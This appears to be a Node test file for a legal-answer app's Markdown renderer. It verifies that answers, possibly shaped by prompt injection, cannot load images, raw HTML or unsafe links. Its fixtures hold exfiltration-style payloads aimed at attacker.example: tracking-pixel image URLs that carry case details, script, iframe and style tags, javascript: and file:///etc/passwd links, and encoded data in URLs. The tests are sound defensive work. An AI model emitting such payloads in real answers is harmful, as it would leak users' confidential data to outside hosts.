// The answer renderer never loads anything by itself (prompt injection).
// Bundles components/Markdown.tsx with esbuild (comes with Vite) and renders
// injected answers with react-dom/server: no <img>, no raw HTML, links only
// http(s)/mailto with the full address on hover.
//   node --test test/*.test.mjs
import test from 'node:test'
import assert from 'node:assert'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { createRequire } from 'node:module'
import { build } from 'esbuild'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const CLIENT = path.resolve(HERE, '..')

let render, safe
test.before(async () => {
  const out = fs.mkdtempSync(path.join(os.tmpdir(), 'openlex-md-'))
  const entry = path.join(out, 'entry.tsx')
  fs.writeFileSync(entry, `
    import { renderToStaticMarkup } from 'react-dom/server'
    import Markdown from ${JSON.stringify(path.join(CLIENT, 'src/components/Markdown.tsx'))}
    export * as safe from ${JSON.stringify(path.join(CLIENT, 'src/lib/safeUrl.ts'))}
    export const render = (md: string) => renderToStaticMarkup(<Markdown>{md}</Markdown>)
  `)
  await build({ entryPoints: [entry], bundle: true, platform: 'node', format: 'cjs', outfile: path.join(out, 'bundle.cjs'), jsx: 'automatic', nodePaths: [path.join(CLIENT, 'node_modules')], logLevel: 'error' })
  ;({ render, safe } = createRequire(import.meta.url)(path.join(out, 'bundle.cjs')))
})

test('a Markdown image never becomes an <img>: shown as "[image: host]"', () => {
  const html = render('Summary.\n\n![logo](https://attacker.example/pixel.gif?d=Alpine%20AG%20settles%20for%202M)\n\n![x](//attacker.example/a.png) ![y](data:image/png;base64,AAAA)')
  assert.ok(!/<img/i.test(html), html)
  assert.match(html, /\[image: attacker\.example\] logo/)
  assert.ok(!/src=/i.test(html), 'no src attribute anywhere')
})

test('raw HTML in an answer is not rendered (no img, iframe, script, style)', () => {
  const html = render('Text <img src="https://attacker.example/x.gif?d=secret"> <iframe src="https://attacker.example"></iframe> <script>alert(1)</script> <style>body{background:url(https://attacker.example/c)}</style> <a href="https://attacker.example">x</a>')
  assert.ok(!/<(img|iframe|script|style)\b/i.test(html), html)
})

test('links: only http(s)/mailto become links, with the full address on hover', () => {
  const html = render('[the law](https://www.ris.bka.gv.at/x) [bad](javascript:alert(1)) [file](file:///etc/passwd) <https://example.com/a?b=c>')
  assert.match(html, /<a href="https:\/\/www\.ris\.bka\.gv\.at\/x" title="https:\/\/www\.ris\.bka\.gv\.at\/x"/)
  assert.ok(!/javascript:/i.test(html.match(/href="[^"]*"/g)?.join(' ') || ''), html)
  assert.ok(!/href="file:/i.test(html), html)
  assert.match(html, /title="https:\/\/example\.com\/a\?b=c"/)
})

test('addresses that can carry data out ask first; plain ones open on a click', () => {
  assert.strictEqual(safe.linkNeedsConfirm('https://www.ris.bka.gv.at/Dokumente/Bundesnormen/NOR40000000/NOR40000000.html'), false)
  assert.strictEqual(safe.linkNeedsConfirm('https://eur-lex.europa.eu/eli/reg/2016/679/oj'), false)
  for (const u of ['https://attacker.example/?d=Alpine', 'https://attacker.example/#Alpine', 'https://attacker.example/[[PARTY_1]]', 'https://attacker.example/QWxwaW5lIEFHIHNldHRsZXMgZm9yIEVVUiAyIG1pbGxpb24gaW4gdGhlIGNhc2U', 'https://user:pw@attacker.example/', 'mailto:x@attacker.example?body=secret']) {
    assert.strictEqual(safe.linkNeedsConfirm(u), true, u)
  }
  assert.strictEqual(safe.safeHref('javascript:alert(1)'), null)
  assert.strictEqual(safe.safeHref('/relative'), null)
  assert.strictEqual(safe.hostOf('https://attacker.example:8443/x'), 'attacker.example:8443')
})

test('the built page carries a Content-Security-Policy without remote sources', { skip: !fs.existsSync(path.join(CLIENT, 'dist/index.html')) && 'run npm run build first' }, () => {
  const html = fs.readFileSync(path.join(CLIENT, 'dist/index.html'), 'utf8')
  const csp = html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)?.[1] || ''
  assert.match(csp, /default-src 'self'/)
  assert.match(csp, /img-src 'self' file: data: blob:(;|$)/)
  assert.match(csp, /object-src 'none'/)
  assert.ok(!/https:|\*/.test(csp), `no remote origin may be allowed: ${csp}`)
  assert.ok(!/<script>(?!<)/.test(html.replace(/<script[^>]*src=[^>]*><\/script>/g, '')), 'no inline script (the policy forbids them)')
})
